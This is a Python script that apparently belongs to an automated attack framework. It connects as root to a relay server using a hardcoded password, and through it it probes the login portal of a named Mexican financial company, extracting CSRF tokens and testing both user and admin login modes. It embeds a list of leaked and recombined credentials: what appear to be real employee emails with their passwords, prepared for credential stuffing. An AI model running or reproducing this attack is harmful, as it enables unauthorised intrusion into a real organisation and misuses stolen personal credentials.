#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - FINDEP PPP KHOR Login v2 - 2-step flow"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="
PPP_URL = "https://ppp.findep.mx/khorLogin.asp"

CREDS = [
    ("bmendezar@findep.com.mx", "1234", "leak-1"),
    ("ehernandezdi@independencia.com.mx", "1234", "leak-2"),
    ("aris89@hotmail.com", "1234567", "leak-3"),
    ("bmendezar", "Findep2021", "leak-4"),
    ("bmendezar", "Pao1234+", "leak-5"),
    ("bmendezar@findep.com.mx", "Findep2021", "combo-1"),
    ("bmendezar@findep.com.mx", "Pao1234+", "combo-2"),
    ("ehernandezdi@independencia.com.mx", "Findep2021", "combo-3"),
    ("ehernandezdi@independencia.com.mx", "Pao1234+", "combo-4"),
    ("aris89@hotmail.com", "Findep2021", "combo-5"),
    ("aris89@hotmail.com", "Pao1234+", "combo-6"),
    ("ehernandezdi", "Findep2021", "combo-7"),
    ("ehernandezdi", "Pao1234+", "combo-8"),
    ("aris89", "1234567", "combo-9"),
    ("aris89", "Findep2021", "combo-10"),
    ("aris89", "Pao1234+", "combo-11"),
]

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def extract_token(html):
    for pat in [r"'value',\s*\"([A-F0-9]+)\"\s*\)", r'CSRFToken[^"]*"([A-F0-9]+)"', r'"value",\s*"([A-F0-9]+)"']:
        m = re.search(pat, html)
        if m: return m.group(1)
    return ""

def main():
    print(f"[*] Connecting to VPS {VPS_HOST}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}
    cookie_file = "/tmp/ppp_v2_cookies.txt"

    # STEP 1: GET login page
    print("\n[*] === STEP 1: GET login page ===")
    cmd = (f"curl -sk -m 20 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
           f"-c {cookie_file} '{PPP_URL}' -o /tmp/ppp_v2_login.html 2>&1; "
           f"wc -c /tmp/ppp_v2_login.html")
    out, _ = ssh_exec(client, cmd, timeout=25)
    print(f"  GET: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/ppp_v2_login.html", timeout=15)
    html1 = out
    log["step1_html"] = html1
    csrf1 = extract_token(html1)
    print(f"  CSRFToken: {csrf1}")
    log["csrf_token_step1"] = csrf1

    # STEP 2: POST modo=user to get login form
    print("\n[*] === STEP 2: POST modo=user ===")
    cmd = (f"curl -sk -m 20 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-e '{PPP_URL}' -d 'modo=user&embedded=0&CSRFToken={csrf1}' "
           f"-o /tmp/ppp_v2_step2.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}}' "
           f"'{PPP_URL}'")
    out, _ = ssh_exec(client, cmd, timeout=25)
    print(f"  POST modo=user: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/ppp_v2_step2.html", timeout=15)
    html2 = out
    log["step2_html_user"] = html2
    safe_print(html2[:4000])
    csrf2 = extract_token(html2) or csrf1
    log["csrf_token_step2"] = csrf2
    usr_field = re.search(r'<input[^>]*name=["\']usr["\'][^>]*>', html2, re.IGNORECASE)
    pwd_field = re.search(r'<input[^>]*name=["\']pwd["\'][^>]*>', html2, re.IGNORECASE)
    print(f"  usr field: {bool(usr_field)} | pwd field: {bool(pwd_field)}")
    if usr_field: print(f"    {usr_field.group(0)}")
    if pwd_field: print(f"    {pwd_field.group(0)}")

    # STEP 2b: modo=admin
    print("\n[*] === STEP 2b: POST modo=admin ===")
    cmd = (f"curl -sk -m 20 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-e '{PPP_URL}' -d 'modo=admin&embedded=0&CSRFToken={csrf1}' "
           f"-o /tmp/ppp_v2_step2b.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}}' "
           f"'{PPP_URL}'")
    out, _ = ssh_exec(client, cmd, timeout=25)
    print(f"  POST modo=admin: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/ppp_v2_step2b.html", timeout=15)
    html2b = out
    log["step2b_html_admin"] = html2b
    safe_print(html2b[:3000])

    # Save state and disconnect for now
    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_ppp_v2_part1.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Part 1 saved to {out_file}")
    client.close()

if __name__ == "__main__":
    main()
